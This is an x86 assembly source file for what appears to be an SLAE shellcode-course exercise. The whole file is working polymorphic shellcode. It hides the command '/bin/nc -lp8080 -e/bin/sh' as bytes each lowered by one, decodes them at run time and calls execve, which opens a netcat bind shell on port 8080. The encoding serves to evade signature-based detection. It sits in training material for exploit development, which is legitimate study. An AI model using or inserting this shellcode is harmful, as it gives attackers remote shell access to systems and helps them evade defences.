;Filename: nc_mod.nasm
;Author: Jonathan So
;Student ID: SLAE-1470
;SLAE-Exercise 6

global _start

section .text

_start:
	jmp short _netcat
_execve:
	pop esi
	;xor eax,eax
	xor ecx, ecx
	mul ecx
	mov cl, 26
	mov edi, esi
incbyte:
	mov dl, byte[edi]	;increase the value byte by byte
	inc edx
	mov byte[edi], dl
	inc edi
	loop incbyte
	mov [esi+0x7],al
	mov [esi+0xf],al
	mov [esi+0x19],al
	mov [esi+0x1a],esi
	lea ebx,[esi+0x8]
	mov [esi+0x1e],ebx
	lea ebx,[esi+0x10]
	mov [esi+0x22],ebx
	mov [esi+0x26],eax
	mov al,0xb
	mov ebx,esi
	lea ecx,[esi+0x1a]
	lea edx,[esi+0x26]
	int 0x80

_netcat:
	call _execve
	;execute db "/bin/nc#-lp8080#-e/bin/sh"
	execute db 0x2e,0x61,0x68,0x6d,0x2e,0x6d,0x62,0x22,0x2c,0x6b,0x6f,0x37,0x2f,0x37,0x2f,0x22,0x2c,0x64,0x2e,0x61,0x68,0x6d,0x2e,0x72,0x67,0x22

